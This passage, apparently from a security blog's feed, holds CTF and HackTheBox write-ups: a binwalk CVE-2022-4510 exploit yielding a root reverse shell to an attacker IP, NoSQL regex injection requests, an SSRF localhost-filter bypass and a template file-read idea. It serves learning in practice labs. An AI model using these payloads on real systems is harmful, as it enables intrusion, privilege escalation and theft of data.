($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;username\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;]) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $db = new PDO(\u0026#39;sqlite:/var/db/pilgrimage\u0026#39;); \u0026lt;...SNIP...\u0026gt; Retrieving database file via ImageMagick Preparing image:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ pngcrush -text a \u0026#34;profile\u0026#34; \u0026#34;/var/db/pilgrimage\u0026#34; sample.png Recompressing IDAT chunks in sample.png to pngout.png Total length of data found in critical chunks = 2206 Best pngcrush method = 4 (ws 15 fm 0 zl 9 zs 1) = 1201 CPU time decode 0.001972, encode 0.007074, other 0.000923, total 0.011578 sec output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ identify -verbose 655a72a92d565.png Image: 655a72a92d565.png Format: PNG (Portable Network Graphics) \u0026lt;...SNIP...\u0026gt; 20480 53514c69746520666f726d61742033001000010100402020000000630000000500000000 000000000000000400000004000000000000000000000001000000000000000000000000 000000000000000000000000000000000000000000000063002e4b910d0ff800040eba00 0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 \u0026lt;...SNIP...\u0026gt; As predicted, the hex is massive. Fortunately, Cyberchef still manages to just barely get the job done. And within the file, we see what looks to be a pair of credentials:\nemily:abigchonkyboi123 If the file is too large to translate, you can try to cut out the long sequences of 0\u0026rsquo;s. Firstly, save into a file:\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ head hex.txt 53514c69746520666f726d61742033001000010100402020000000630000000500000000 000000000000000400000004000000000000000000000001000000000000000000000000 000000000000000000000000000000000000000000000063002e4b910d0ff800040eba00 0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000 Use sed to remove lines that are full 0:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ sed \u0026#39;s/000000000000000000000000000000000000000000000000000000000000000000000000//\u0026#39; hex.txt | grep . 53514c69746520666f726d61742033001000010100402020000000630000000500000000 000000000000000400000004000000000000000000000001000000000000000000000000 000000000000000000000000000000000000000000000063002e4b910d0ff800040eba00 0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000007c030717191901815374 61626c65696d61676573696d6167657304435245415445205441424c4520696d61676573 202875726c2054455854205052494d415259204b4559204e4f54204e554c4c2c206f7269 67696e616c2054455854204e4f54204e554c4c2c20757365726e616d652054455854204e 4f54204e554c4c292b0406173f190100696e64657873716c6974655f6175746f696e6465 785f696d616765735f31696d616765730566010717171701812b7461626c657573657273 757365727302435245415445205441424c452075736572732028757365726e616d652054 455854205052494d415259204b4559204e4f54204e554c4c2c2070617373776f72642054 455854204e4f54204e554c4c29290206173d170100696e64657873716c6974655f617574 6f696e6465785f75736572735f3175736572730300000008000000000d000000020fdf00 0fe60fdf0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000502030f0f2761180103172d65 6d696c796162696763686f6e6b79626f693132330a000000020ff1000ff10ff700000000 00000000000000000000000000000000000000000000000000000000000000000005030f 01270208031709656d696c790d000000030f2a000fa90f690f2a00000000000000000000 0000000000003d030469210f687474703a2f2f70696c6772696d6167652e6874622f7368 72756e6b2f363535613733613237663437612e706e676474626173652e706e67273e0204 69230f687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f36353561 3732626237666237392e706e676578706c6f69742e706e672755010469510f687474703a 2f2f70696c6772696d6167652e6874622f736872756e6b2f363535613663356663376239 352e706e6753637265656e73686f745f323032332d31302d30315f31355f34375f32302e 706e67270a000000030f68000fce0f9b0f68000000000000000000000000000000000000 00000000000000000000000000000000000000000000000032036901687474703a2f2f70 696c6772696d6167652e6874622f736872756e6b2f363535613733613237663437612e70 6e670332036901687474703a2f2f70696c6772696d6167652e6874622f736872756e6b2f 363535613732626237666237392e706e670231036909687474703a2f2f70696c6772696d 6167652e6874622f736872756e6b2f363535613663356663376239352e706e67 The hex is much more manageable now, and the password is retained:\nPrivilege Escalation Enumeration as emily With these credentials, we can access ssh:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ ssh emily@pilgrimage.htb \u0026lt;...SNIP...\u0026gt; emily@pilgrimage:~$ whoami emily Emily does not have sudo privileges:\n1 2 3 emily@pilgrimage:~$ sudo -l [sudo] password for emily: Sorry, user emily may not run sudo on pilgrimage. When checking running processes, we can find an interesting script named malwarescan.sh being run as root:\n1 2 3 4 5 emily@pilgrimage:/tmp$ ps -aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.2 163784 10048 ? Ss 02:34 0:03 /sbin/init \u0026lt;...SNIP...\u0026gt; root 754 0.0 0.0 6816 2948 ? Ss 02:35 0:00 /bin/bash /usr/sbin/malwarescan.sh Reading the contents:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh #!/bin/bash blacklist=(\u0026#34;Executable script\u0026#34; \u0026#34;Microsoft executable\u0026#34;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=\u0026#34;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \u0026#34;$FILE\u0026#34; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e \u0026#39;s/^.*CREATE //p\u0026#39;)\u0026#34; binout=\u0026#34;$(/usr/local/bin/binwalk -e \u0026#34;$filename\u0026#34;)\u0026#34; for banned in \u0026#34;${blacklist[@]}\u0026#34;; do if [[ \u0026#34;$binout\u0026#34; == *\u0026#34;$banned\u0026#34;* ]]; then /usr/bin/rm \u0026#34;$filename\u0026#34; break fi done done It appears that, when files are added to the /shrunk/ folder, this malwarescan script will run binwalk -e, extracting components. If there are blacklisted contents in the output, the file is removed. Running binwalk will get us the version, and we can search for vulnerabilities:\n1 2 3 emily@pilgrimage:~$ binwalk Binwalk v2.3.2 With a quick google search, we can find an exploit-db post on this.\nRemote Code Execution via Binwalk vulnerability The exploit script takes an input image, an attack IP address, and an attacker port number:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ python cve-2022-4510.py sample.png 10.10.14.126 8888 ################################################ ------------------CVE-2022-4510---------------- ################################################ --------Binwalk Remote Command Execution-------- ------Binwalk 2.1.2b through 2.3.2 included----- ------------------------------------------------ ################################################ ----------Exploit by: Etienne Lacoche----------- ---------Contact Twitter: @electr0sm0g---------- ------------------Discovered by:---------------- ---------Q. Kaiser, ONEKEY Research Lab--------- ---------Exploit tested on debian 11------------ ################################################ You can now rename and share binwalk_exploit and start your local netcat listener. The file can be placed directly through scp:\n1 2 3 4 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ scp ./innocent.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/ emily@pilgrimage.htb\u0026#39;s password: innocent.png 100% 2969 69.5KB/s 00:00 Immediately after uploading, my nc listener receives a connection:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.126] from (UNKNOWN) [10.10.11.219] 36406 whoami root Reflection I particularly enjoy boxes focused around a particular theme, in this situation: image manipulation. I appreciate how this box keeps it mostly simple while showcasing a couple recent CVEs related to extremely common image tools. Retrieving a password from the database directly in this manner was unintuitive for me, as clearly the database file was messy to work with. However with knowing the username we look for, it is easy to identify.\n","date":"2023-11-25T11:34:42-06:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-pilgrimage/Pilgrimage_hu3ac6b8ba1be9f0f197acee68b2bc6c42_314037_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-pilgrimage/","title":"HackTheBox - Pilgrimage"},{"content":"Web CTFC I\u0026rsquo;m excited to share my minimal CTF platform with you all, take a look! btw it\u0026rsquo;s ImPAWSIBLE to solve all challenges 😺\nNote: flag format is INTIGRITI{.*}\nAuthor: Jopraveen\nWe are provided with source code for the challenge, which details the interaction we can have. The important things to note are where the flag might be located with the Dockerfile, and how we can interact with the backend of the server. from the Dockerfile, we see the flag is stored as an environment:\n1 2 3 4 5 6 7 8 9 10 $ cat Dockerfile \u0026lt;...SNIP...\u0026gt; # Setup flask app \u0026amp; create flag EXPOSE 80 ENV FLASK_APP=/app/IntCTFC/app.py ENV FLASK_ENV=production ENV FLASK_RUN_PORT=80 ENV FLASK_RUN_HOST=0.0.0.0 ENV CHALL_FLAG=\u0026#34;1337UP{fl4G_h3RE}\u0026#34; ENV SECRET_KEY=\u0026#34;fake_secret_key\u0026#34; Secret keys are usually used for cookie signing, so this is not something interesting just yet. In the main app.py, we can see how the flag is used:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def createChalls(): db.challs.insert_one({\u0026#34;_id\u0026#34;: \u0026#34;28c8edde3d61a0411511d3b1866f0636\u0026#34;,\u0026#34;challenge_name\u0026#34;: \u0026#34;C rack It\u0026#34;,\u0026#34;category\u0026#34;: \u0026#34;hash\u0026#34;,\u0026#34;challenge_description\u0026#34;: \u0026#34;My friend sent me this random string ` cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{\u0026lt;password \u0026gt;}\u0026#34;,\u0026#34;challenge_flag\u0026#34;: \u0026#34;CTFC{cryptocat}\u0026#34;,\u0026#34;points\u0026#34;: \u0026#34;500\u0026#34;,\u0026#34;released\u0026#34;: \u0026#34;True\u0026#34;}) db.challs.insert_one({\u0026#34;_id\u0026#34;: \u0026#34;665f644e43731ff9db3d341da5c827e1\u0026#34;,\u0026#34;challenge_name\u0026#34;: \u0026#34;M eoW sixty IV\u0026#34;,\u0026#34;category\u0026#34;: \u0026#34;crypto\u0026#34;,\u0026#34;challenge_description\u0026#34;: \u0026#34;hello everyoneeeeeeeee Q1RGQ3tu MHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these ra ndom characters\u0026#34;,\u0026#34;challenge_flag\u0026#34;: \u0026#34;CTFC{n0w_g0_4_th3_r34L_fl4G}\u0026#34;,\u0026#34;points\u0026#34;: \u0026#34;1000\u0026#34;,\u0026#34;released \u0026#34;: \u0026#34;True\u0026#34;}) db.challs.insert_one({\u0026#34;_id\u0026#34;: \u0026#34;38026ed22fc1a91d92b5d2ef93540f20\u0026#34;,\u0026#34;challenge_name\u0026#34;: \u0026#34;I mPAWSIBLE\u0026#34;,\u0026#34;category\u0026#34;: \u0026#34;web\u0026#34;,\u0026#34;challenge_description\u0026#34;: \u0026#34;well, this challenge is not fully cre ated yet, but we have the flag for it\u0026#34;,\u0026#34;challenge_flag\u0026#34;: os.environ[\u0026#39;CHALL_FLAG\u0026#39;],\u0026#34;points\u0026#34;: \u0026#34;1500\u0026#34;,\u0026#34;released\u0026#34;: \u0026#34;False\u0026#34;}) The third challenge is using the flag as an answer key, from the looks of it. In lines prior to this, we can note that the database service this challenge is using is MongoDB, a NoSQL type of database:\n1 2 3 # db settings client = pymongo.MongoClient(\u0026#39;localhost\u0026#39;,27017) db = client.ctfdb when we enter the page, we are prompted to create an account. There are no limitations, so creating an account is very simple. When we enter, we see two challenges associated to the first 2 entries in the database:\nThe third challenge is not there, but notice the \u0026ldquo;release\u0026rdquo; is set to \u0026ldquo;False\u0026rdquo; for the third one. When trying to answer questions for the one listed, we see the answers match what we expect from the database:\nIf we analyze our request using Burp proxy or perhaps just with Firefox\u0026rsquo;s Network tool, we can see the request data being sent:\nIn raw data:\n1 {\u0026#34;_id\u0026#34;:\u0026#34;_id:1\u0026#34;,\u0026#34;challenge_flag\u0026#34;:\u0026#34;CTFC{cryptocat}\u0026#34;} If we modify this request to \u0026quot;_id:3\u0026quot;, then perhaps we can send a request to the 3rd challenge. However, the answer will be the flag, which we do not know. Since this is NoSQL, we might be able to abuse NoSQL Injection combined with regex queries to leak the flag. The concept goes as follows: using regex wildcards, we can generate a passing result despite knowing none of the characters. We can sequentially guess a single character 1 request at a time, and whenever we land on a correct one, the check will once again pass. For this, I copied my network request directly to curl although utilizing a tool such as Brupsuite will have a cleaner look to manage:\nThe unmodified curl request looks like this:\n1 curl \u0026#39;https://ctfc.ctf.intigriti.io/submit_flag\u0026#39; -X POST -H \u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0\u0026#39; -H \u0026#39;Accept: */*\u0026#39; -H \u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H \u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H \u0026#39;Referer: https://ctfc.ctf.intigriti.io/\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -H \u0026#39;Origin: https://ctfc.ctf.intigriti.io\u0026#39; -H \u0026#39;DNT: 1\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Cookie: session=eyJ1c2VyIjp7Il9pZCI6ImI5MTk2YjgzYjZlZDQ1ZTZiOGVjMTM3YTcxNTRmNmViIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVeEiA.I5nW0lG2m4QufY4UuiKTpLmNqBM\u0026#39; -H \u0026#39;Sec-Fetch-Dest: empty\u0026#39; -H \u0026#39;Sec-Fetch-Mode: cors\u0026#39; -H \u0026#39;Sec-Fetch-Site: same-origin\u0026#39; --data-raw \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:1\u0026#34;,\u0026#34;challenge_flag\u0026#34;:\u0026#34;CTFC{cryptocat}\u0026#34;}\u0026#39; To modify, we insert new JSON into the key for \u0026ldquo;correct_flag\u0026rdquo;, so that regex may be applied:\n1 \u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;.*\u0026#34;} We can confirm this works by checking regex with the flag header and brackets that we already know:\n1 2 3 4 5 6 7 8 9 10 curl \u0026#39;https://ctfc.ctf.intigriti.io/submit_flag\u0026#39; -X POST -H \u0026#39;Us er-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0\u0026#39; -H \u0026#39;Accept : */*\u0026#39; -H \u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H \u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H \u0026#39;Refe rer: https://ctfc.ctf.intigriti.io/\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -H \u0026#39;Origin: https:/ /ctfc.ctf.intigriti.io\u0026#39; -H \u0026#39;DNT: 1\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Cookie: session=eyJ1c2Vy Ijp7Il9pZCI6ImI5MTk2YjgzYjZlZDQ1ZTZiOGVjMTM3YTcxNTRmNmViIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVeEiA. I5nW0lG2m4QufY4UuiKTpLmNqBM\u0026#39; -H \u0026#39;Sec-Fetch-Dest: empty\u0026#39; -H \u0026#39;Sec-Fetch-Mode: cors\u0026#39; -H \u0026#39;Sec-Fe tch-Site: same-origin\u0026#39; --data-raw \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{.*}\u0026#34; }}\u0026#39; correct flag! The response is correct flag! At this point it is probably better to just write a script to guess all combinations, or we can be mildly clever and do it manually with the slight help of extra regex. We can start by seeing if the first bracket char is lowercase by guessing [a-z], or all lowercase chars between a and z:\n1 2 3 4 curl \u0026lt;...SNIP...\u0026gt; --data-raw \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{[a-z].*}\u0026#34;}}\u0026#39; correct flag! We can guess half the alphabet, to narrow down which letter it might be:\n1 2 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{[a-m].*}\u0026#34;}}\u0026#39; correct flag! After a couple more guesses, we narrowed down the range to 4 characters, a much easier guess than 26+:\n1 2 3 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{[g-k ].*}\u0026#34;}}\u0026#39; correct flag! The first letter is h, so in only ~6 guesses we managed to guess a letter. Pretty good, considering there are 26 possibilities in lowercase alone! Now we can repeat the process, keeping the 1st char as h and guessing the 2nd one:\n1 2 3 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{h[a- z].*}\u0026#34;}}\u0026#39; wrong flag! And so on.. Eventually, we can leak the entire flag:\n1 2 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{h0w_1s_7h4t_PAWSIBLE}\u0026#34;}}\u0026#39; correct flag! Note that in this case the wildcard is gone, as a final check to see if the flag is complete. We don\u0026rsquo;t really need the $regex json either. INTIGRITI{h0w_1s_7h4t_PAWSIBLE}\nOSINT Photographs Can you help us track down this photographer? 📸\nAuthor: therealbrenu\nThe first photo is a simple lizard on a fence:\nThe very first thing to check is image metadata via exiftool:\n1 2 3 4 5 6 $ exiftool picture.jpg ExifTool Version Number : 12.65 \u0026lt;...SNIP...\u0026gt; Modify Date : 2023:09:25 23:42:32 Artist : fl0pfl0p5 \u0026lt;...SNIP...\u0026gt; We can see the artist is named fl0pfl0p5. A quick google search for the name reveals an about.me page, and a reddit account. Delving further into reddit in particular, we can see another reddit page of interest:\nIn the 2nd post, we see a different named user created a github page under the name fl0pfl0p5.\nThe github page itself is not useful, but does have a cute dead end. A hello world script has a commit \u0026ldquo;removed hardcoded secret\u0026rdquo;:\nThe important information from the reddit post is we now have a different username connected, m4r64r1n3. We can find that this person has a twitter account as well, and if you\u0026rsquo;re paying careful attention you might also note that the account was created in September, the same time where all previous activity has been happening.\nWe can see that this person posted a different picture on the twitter account. Analyzing with exiftool does not give us more information, but when we image search via google, we can find it is associated with a new blog page, and a 3rd username. Note that in order to see this result, I had to select \u0026ldquo;Find Image Source\u0026rdquo; on the image results page.\nWhen we visit the blog page, we see an interesting anonymous comment: \u0026ldquo;I don\u0026rsquo;t think it\u0026rsquo;s a good idea to share your location online.\u0026rdquo; Wise words indeed.\nThere is no location disclosure here anymore though, but perhaps it has been saved in the web archives. When we check the wayback machine, we can see an archive conveniently placed on October 2, 1 day before this comment about sharing a location.\nWhen we view the archive, we see the flag!\nINTIGRITI{D3F1N173LY_N07_60TH4M_C17Y}\n","date":"2023-11-18T10:18:48-05:00","permalink":"https://yuwenmichael.netlify.app/post/1337up-ctf/","title":"1337UP CTF"},{"content":"Web Haunt Mart An eerie expedition into the world of online retail, where the most sinister and spine-tingling inventory reigns supreme. Can you take it down?\nChecking source code: config.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from application.util import generate class Config(object): SECRET_KEY = generate(50) MYSQL_HOST = \u0026#39;localhost\u0026#39; MYSQL_USER = \u0026#39;xclow3n\u0026#39; MYSQL_PASSWORD = \u0026#39;xclow3n\u0026#39; MYSQL_DB = \u0026#39;hauntmart\u0026#39; FLAG = open(\u0026#39;/flag.txt\u0026#39;).read() class ProductionConfig(Config): pass class DevelopmentConfig(Config): DEBUG = True class TestingConfig(Config): TESTING = True We can see our flag is set as a FLAG variable, and also note that DEBUG/TESTING is set to true. The route is also intersting:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 from application.database import * from flask import Blueprint, redirect, render_template, request, session, current_app from application.util import response, isAuthenticated, generateToken, isFromLocalhost, downloadManual import sys web = Blueprint(\u0026#39;web\u0026#39;, __name__) api = Blueprint(\u0026#39;api\u0026#39;, __name__) @web.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def loginView(): return render_template(\u0026#39;login.html\u0026#39;) @web.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def registerView(): return render_template(\u0026#39;register.html\u0026#39;) @web.route(\u0026#39;/home\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) @isAuthenticated def homeView(user): return render_template(\u0026#39;index.html\u0026#39;, user=user, flag=current_app.config[\u0026#39;FLAG\u0026#39;]) @web.route(\u0026#39;/product\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) @isAuthenticated def productView(user): return render_template(\u0026#39;product.html\u0026#39;, user=user) @web.route(\u0026#39;/logout\u0026#39;) def logout(): session[\u0026#39;token\u0026#39;] = None return redirect(\u0026#39;/\u0026#39;) @api.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_login(): if not request.is_json: return response(\u0026#39;Invalid JSON!\u0026#39;), 400 data = request.get_json() username = data.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = data.get(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) if not username or not password: return response(\u0026#39;All fields are required!\u0026#39;), 401 user = loginUserDb(username, password) if user: token = generateToken(user.get(\u0026#39;username\u0026#39;), user.get(\u0026#39;role\u0026#39;)) session[\u0026#39;token\u0026#39;] = token return response(\u0026#39;Success\u0026#39;), 200 return response(\u0026#39;Invalid credentials!\u0026#39;), 403 @api.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_register(): if not request.is_json: return response(\u0026#39;Invalid JSON!\u0026#39;), 400 data = request.get_json() username = data.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = data.get(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) if not username or not password: return response(\u0026#39;All fields are required!\u0026#39;), 401 user = registerUserDb(username, password, \u0026#39;user\u0026#39;) if user: return response(\u0026#39;User registered! Please login\u0026#39;), 200 return response(\u0026#39;User already exists!\u0026#39;), 403 @api.route(\u0026#39;/product\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) @isAuthenticated def sellProduct(user): if not request.is_json: return response(\u0026#39;Invalid JSON!\u0026#39;), 400 data = request.get_json() name = data.get(\u0026#39;name\u0026#39;, \u0026#39;\u0026#39;) price = data.get(\u0026#39;price\u0026#39;, \u0026#39;\u0026#39;) description = data.get(\u0026#39;description\u0026#39;, \u0026#39;\u0026#39;) manualUrl = data.get(\u0026#39;manual\u0026#39;, \u0026#39;\u0026#39;) if not name or not price or not description or not manualUrl: return response(\u0026#39;All fields are required!\u0026#39;), 401 manualPath = downloadManual(manualUrl) if (manualPath): addProduct(name, description, price) return response(\u0026#39;Product submitted! Our mods will review your request\u0026#39;) return response(\u0026#39;Invalid Manual URL!\u0026#39;), 400 @api.route(\u0026#39;/addAdmin\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) @isFromLocalhost def addAdmin(): username = request.args.get(\u0026#39;username\u0026#39;) if not username: return response(\u0026#39;Invalid username\u0026#39;), 400 result = makeUserAdmin(username) if result: return response(\u0026#39;User updated!\u0026#39;) return response(\u0026#39;Invalid username\u0026#39;), 400 Note the addAdmin route, the only security measure is to accept requests from localhost. If we can find SSRF, we can add our account to admin. Exploring the webpage:\nVery quickly, I find the product page, where we might sell a product. The description details that moderators will \u0026ldquo;verify the product thoroughly\u0026rdquo;\nIf our moderator blindly clicks everything, we might get away with just sending him a link to add our user as admin. Otherwise, we might consider a cheeky XSS payload that does this upon loading our request.\nWe see an invalid URL error. It is a little difficult to troubleshoot over the webpage, but when we examine the source code again we can see the problem. In util.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import os, jwt, datetime, requests from functools import wraps from flask import jsonify, abort, session, request generate = lambda x: os.urandom(x).hex() key = generate(50) blocked_host = [\u0026#34;127.0.0.1\u0026#34;, \u0026#34;localhost\u0026#34;, \u0026#34;0.0.0.0\u0026#34;] \u0026lt;...SNIP...\u0026gt; def isSafeUrl(url): for hosts in blocked_host: if hosts in url: return False return True \u0026lt;...SNIP...\u0026gt; def downloadManual(url): safeUrl = isSafeUrl(url) if safeUrl: try: local_filename = url.split(\u0026#34;/\u0026#34;)[-1] r = requests.get(url) with open(f\u0026#34;/opt/manualFiles/{local_filename}\u0026#34;, \u0026#34;wb\u0026#34;) as f: for chunk in r.iter_content(chunk_size=1024): if chunk: f.write(chunk) return True except: return False return False There are a list of blocked hosts, which are being filtered. Fortunately for us, the url request for localhost is not case sensitive. We can bypass this filter by adding uppercase letters, such as locAlhost, and the request will still be interpreted as the local host address, 127.0.0.1.\nThe request successfully goes though, but I wasn\u0026rsquo;t seeing any flag. At this point, I decided to run a local copy with the provided Docker files so I might see requests happening in the CLI:\n1 2 3 4 5 6 7 8 9 $ sudo ./build-docker.sh \u0026lt;...SNIP...\u0026gt; * Running on http://127.0.0.1:1337 * Running on http://172.17.0.2:1337 Press CTRL+C to quit * Restarting with stat * Debugger is active! * Debugger PIN: 110-143-363 2023-10-26 17:36:49,496 INFO success: flask entered RUNNING state, process has stayed up for \u0026gt; than 1 seconds (startsecs) Now when I visit a site on the address http://127.0.0.1:1337, this running program will give me backend info on the request. Example, visiting the main page:\n1 2 3 4 5 6 172.17.0.1 - - [26/Oct/2023 17:36:51] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 172.17.0.1 - - [26/Oct/2023 17:36:51] \u0026#34;GET /static/css/bootstrap.min.css HTTP/1.1\u0026#34; 304 - 172.17.0.1 - - [26/Oct/2023 17:36:51] \u0026#34;GET /static/css/style.css HTTP/1.1\u0026#34; 304 - 172.17.0.1 - - [26/Oct/2023 17:36:51] \u0026#34;GET /static/js/jquery.js HTTP/1.1\u0026#34; 304 - 172.17.0.1 - - [26/Oct/2023 17:36:51] \u0026#34;GET /static/js/script.js HTTP/1.1\u0026#34; 304 - 172.17.0.1 - - [26/Oct/2023 17:36:51] \u0026#34;GET /static/images/logo.png HTTP/1.1\u0026#34; 304 - When I view the product submission, I can see my injected URL also being visited:\n1 2 127.0.0.1 - - [26/Oct/2023 17:46:53] \u0026#34;GET /addAdmin?username=asdf HTTP/1.1\u0026#34; 404 - 172.17.0.1 - - [26/Oct/2023 17:46:53] \u0026#34;POST /api/product HTTP/1.1\u0026#34; 200 - The 2nd POST request is referring to my submission on the product page while the 1st GET request is where i directed the Manual URL. Note that the request response is a 404 error, equivalent to a page not found or not existing. Something I had overlooked was the route behavior differences between web and api. The above route source code details some routes as @api.route and others as @web.route. All page visits we have been seeing are web.route, meanwhile things such as the login post and product post are for api.route. A careful look at the POST request for product shows the address as /api/product. All this to say, I was submitting the address wrong after all. We should be looking to send it to /api/addAdmin instead!\nThe request shows green submission, and looking at the request log, we can see a response code 200 this time:\n1 2 127.0.0.1 - - [26/Oct/2023 17:57:06] \u0026#34;GET /api/addAdmin?username=asdf HTTP/1.1\u0026#34; 200 - 172.17.0.1 - - [26/Oct/2023 17:57:06] \u0026#34;POST /api/product HTTP/1.1\u0026#34; 200 - At this stage for some reason I had to log out and log back in, perhaps a caching issue? Regardless, once I return to the home page I find the flag!\nGhostly Templates In the dark corners of the internet, a mysterious website has been making waves among the cybersecurity community. This site, known for its Halloween-themed templates, has sparked rumors of an eerie secret lurking beneath the surface. Will you delve into this dark and spooky webapp to uncover the hidden truth?\nGhostly Templates is a web server utilizing Go. There is only one main page, and it mentions potential template functions we might try, and a submission form to supply our template link:\nDistraction: LFI through view. Within the view?page=, it feels like directory traversal might be possible. We can even access main.go.\nHowever, this is not the way. If we look at the source code, we can see that there is a function checking if we are accessing a file outside of the web root folder:\n1 2 3 if !reqData.IsSubdirectory(\u0026#34;./\u0026#34;, TEMPLATE_DIR+\u0026#34;/\u0026#34;+page) { http.Error(w, \u0026#34;Internal Server Error\u0026#34;, http.StatusInternalServerError) return This was something I did not find a bypass for, but there is a different solution. Also within the source code, we find an interesting function:\n1 2 3 4 5 6 7 func (p RequestData) OutFileContents(filePath string) string { data, err := os.ReadFile(filePath) if err != nil { return err.Error() } return string(data) } We can supply an html file that calls OutFileContents, have the service load our template, then execute a read on flag.txt. 